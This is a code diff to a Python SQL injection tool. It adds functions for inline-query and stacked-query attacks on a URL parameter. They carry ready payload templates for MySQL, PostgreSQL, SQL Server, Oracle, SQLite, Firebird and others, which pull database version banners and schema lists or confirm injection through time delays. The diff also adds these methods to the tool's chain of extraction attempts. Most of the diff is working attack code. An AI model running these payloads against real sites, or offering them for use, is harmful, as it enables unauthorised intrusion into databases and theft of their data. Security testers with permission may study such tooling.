@@ -9,14 +9,12 @@ from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
 logger = logging.getLogger(__name__)
 _processed_url_params = set()
 
-
 def extract_between_delimiters(text, delimiter_start='~', delimiter_end='~'):
     pattern = re.compile(re.escape(delimiter_start) + r'(.*?)' + re.escape(delimiter_end), re.DOTALL)
     match = pattern.search(text)
     if match:
         return match.group(1).strip()
     return None
-
 
 def replace_parameter(url, param, payload):
     parsed = urlparse(url)
@@ -34,15 +32,12 @@ def replace_parameter(url, param, payload):
         parsed.fragment
     ))
 
-
 def get_random_numbers():
     return random.randint(100, 999), random.randint(100, 999)
-
 
 def get_random_string(length=8):
     chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
     return ''.join(random.choice(chars) for _ in range(length))
-
 
 def test_payload(test_url, delimiter_start, delimiter_end):
     try:
@@ -53,7 +48,6 @@ def test_payload(test_url, delimiter_start, delimiter_end):
         return False, None
     except Exception:
         return False, None
-
 
 def fetch_error_based(url, param, result_manager, domain):
     rnd1, rnd2 = get_random_numbers()
@@ -173,7 +167,6 @@ def fetch_error_based(url, param, result_manager, domain):
         return True
     return False
 
-
 def fetch_union_based(url, param, result_manager, domain):
     logger.info("Attempting Union-based SQLi extraction")
     try:
@@ -272,6 +265,89 @@ def fetch_union_based(url, param, result_manager, domain):
         logger.error(f"Union-based extraction error: {str(e)}")
         return False
 
+def fetch_inline_query(url, param, result_manager, domain):
+    logger.info("Attempting Inline Query SQLi extraction")
+    try:
+        rnd1, rnd2 = get_random_numbers()
+        delimiter_start = chr(0x7e)
+        delimiter_end = chr(0x7e)
+
+        banner_queries = {
+            'MySQL': 'VERSION()',
+            'PostgreSQL': 'VERSION()',
+            'Microsoft SQL Server': '@@VERSION',
+            'Sybase': '@@VERSION',
+            'Oracle': '(SELECT banner FROM v$version WHERE ROWNUM=1)',
+            'SQLite': 'sqlite_version()',
+            'Firebird': 'RDB$GET_CONTEXT(\'SYSTEM\',\'ENGINE_VERSION\')',
+            'ClickHouse': 'version()'
+        }
+
+        db_queries = {
+            'MySQL': 'GROUP_CONCAT(schema_name SEPARATOR \',\') FROM information_schema.schemata',
+            'PostgreSQL': 'STRING_AGG(schemaname, \',\') FROM pg_tables',
+            'Microsoft SQL Server': 'STRING_AGG(name, \',\') FROM master.sys.databases',
+            'Sybase': 'STRING_AGG(name, \',\') FROM master.sys.databases',
+            'Oracle': 'LISTAGG(owner, \',\') WITHIN GROUP (ORDER BY owner) FROM (SELECT DISTINCT owner FROM all_tables)',
+            'SQLite': 'GROUP_CONCAT(name, \',\') FROM sqlite_master WHERE type=\'table\'',
+            'Firebird': 'STRING_AGG(rdb$relation_name, \',\') FROM rdb$relations WHERE rdb$view_blr IS NULL'
+        }
+
+        # Inline query payload templates
+        inline_payloads = {
+            'MySQL': lambda q: f"' AND (SELECT CONCAT('{delimiter_start}',({q}),'{delimiter_end}'))-- -",
+            'PostgreSQL': lambda q: f"' AND (SELECT '{delimiter_start}'||({q})::text||'{delimiter_end}')-- -",
+            'Microsoft SQL Server': lambda q: f"' AND (SELECT '{delimiter_start}'+({q})+'{delimiter_end}')-- -",
+            'Sybase': lambda q: f"' AND (SELECT '{delimiter_start}'+({q})+'{delimiter_end}')-- -",
+            'Oracle': lambda q: f"' AND (SELECT '{delimiter_start}'||({q})||'{delimiter_end}' FROM DUAL)-- -",
+            'SQLite': lambda q: f"' AND (SELECT '{delimiter_start}'||({q})||'{delimiter_end}')-- -",
+            'Firebird': lambda q: f"' AND (SELECT '{delimiter_start}'||({q})||'{delimiter_end}' FROM RDB$DATABASE)-- -",
+            'ClickHouse': lambda q: f"' AND ('{delimiter_start}'||CAST(({q}) AS String)||'{delimiter_end}')-- -"
+        }
+
+        detected_dbms = None
+        extracted_banner = None
+        extracted_dbs = []
+        success = False
+
+        for dbms, banner_query in banner_queries.items():
+            if dbms in inline_payloads:
+                payload_func = inline_payloads[dbms]
+                test_banner_payload = payload_func(banner_query)
+                test_url = replace_parameter(url, param, test_banner_payload)
+                success_banner, extracted_banner_val = test_payload(test_url, delimiter_start, delimiter_end)
+
+                if success_banner:
+                    detected_dbms = dbms
+                    extracted_banner = extracted_banner_val
+                    success = True
+
+                    if dbms in db_queries:
+                        db_query = db_queries[dbms]
+                        test_db_payload = payload_func(db_query)
+                        test_url_db = replace_parameter(url, param, test_db_payload)
+                        success_db, extracted_dbs_val = test_payload(test_url_db, delimiter_start, delimiter_end)
+                        if success_db and extracted_dbs_val:
+                            extracted_dbs = [db.strip() for db in extracted_dbs_val.split(',') if db.strip()]
+                    break
+
+        if extracted_banner or extracted_dbs:
+            logger.info("Successfully extracted data via Inline Query SQLi")
+            result_manager.append_sql_injection(
+                url,
+                param,
+                f"Inline query extraction successful (DBMS: {detected_dbms or 'unknown'})",
+                extra={
+                    'dbms': detected_dbms,
+                    'banner': extracted_banner,
+                    'databases': extracted_dbs
+                }
+            )
+            return True
+        return False
+    except Exception as e:
+        logger.error(f"Inline query extraction error: {str(e)}")
+        return False
 
 def fetch_boolean_blind(url, param, result_manager, domain):
     logger.info("Attempting Boolean Blind SQLi extraction")
@@ -349,7 +425,6 @@ def fetch_boolean_blind(url, param, result_manager, domain):
         logger.error(f"Boolean Blind extraction error: {str(e)}")
     return False
 
-
 def fetch_time_based(url, param, result_manager, domain):
     logger.info("Attempting Time-based SQLi extraction")
     sleep_time = 5
@@ -422,6 +497,55 @@ def fetch_time_based(url, param, result_manager, domain):
         logger.error(f"Time-based extraction error: {str(e)}")
     return False
 
+def fetch_stacked_queries(url, param, result_manager, domain):
+    logger.info("Attempting Stacked Queries SQLi test")
+    try:
+        sleep_time = 5
+        rnd_str = get_random_string()
+
+        # Stacked query payloads for different DBMS
+        stacked_payloads = [
+            # MySQL
+            (f";SELECT SLEEP({sleep_time})-- -", "MySQL"),
+            (f";SELECT SLEEP({sleep_time})#", "MySQL"),
+            (f";(SELECT * FROM (SELECT(SLEEP({sleep_time}))) {rnd_str})-- -", "MySQL"),
+            
+            # PostgreSQL
+            (f";SELECT PG_SLEEP({sleep_time})-- -", "PostgreSQL"),
+            (f";SELECT PG_SLEEP({sleep_time})", "PostgreSQL"),
+            
+            # MSSQL/Sybase
+            (f";WAITFOR DELAY '0:0:{sleep_time}'-- -", "Microsoft SQL Server"),
+            (f";WAITFOR DELAY '0:0:{sleep_time}'", "Microsoft SQL Server"),
+            (f";DECLARE @x CHAR(9);SET @x=0x303a303a3{sleep_time};WAITFOR DELAY @x-- -", "Microsoft SQL Server"),
+            
+            # Oracle
+            (f";SELECT DBMS_PIPE.RECEIVE_MESSAGE('{rnd_str}',{sleep_time}) FROM DUAL-- -", "Oracle"),
+            (f";BEGIN DBMS_LOCK.SLEEP({sleep_time}); END-- -", "Oracle")
+        ]
+
+        for payload, dbms in stacked_payloads:
+            test_url = replace_parameter(url, param, payload)
+            try:
+                start = time.time()
+                response = requests.get(test_url, timeout=20, allow_redirects=True)
+                elapsed = time.time() - start
+                if elapsed >= sleep_time - 1:
+                    logger.info(f"Stacked queries successful for DBMS: {dbms}")
+                    result_manager.append_sql_injection(
+                        url,
+                        param,
+                        f"Stacked queries extraction successful (DBMS: {dbms})",
+                        extra={'dbms': dbms, 'sleep_time_detected': elapsed}
+                    )
+                    return True
+            except Exception:
+                continue
+
+        return False
+    except Exception as e:
+        logger.error(f"Stacked queries test error: {str(e)}")
+        return False
 
 def fetch_databases_once(url, param, verbose=False):
     key = (url, param)
@@ -438,18 +562,21 @@ def fetch_databases_once(url, param, verbose=False):
 
     success = False
 
-    # Order of preference: Error-based -> Union-based -> Boolean-based -> Time-based
+    # Order of preference
     if not success:
         success = fetch_error_based(url, param, result_manager, domain)
-
     if not success:
         print_warning("Error-based extraction failed, trying Union-based")
         success = fetch_union_based(url, param, result_manager, domain)
-
     if not success:
-        print_warning("Union-based extraction failed, trying Boolean Blind")
+        print_warning("Union-based extraction failed, trying Inline query")
+        success = fetch_inline_query(url, param, result_manager, domain)
+    if not success:
+        print_warning("Inline query failed, trying Stacked queries")
+        success = fetch_stacked_queries(url, param, result_manager, domain)
+    if not success:
+        print_warning("Stacked queries failed, trying Boolean Blind")
         success = fetch_boolean_blind(url, param, result_manager, domain)
-
     if not success:
         print_warning("Boolean Blind failed, trying Time-based")
         success = fetch_time_based(url, param, result_manager, domain)
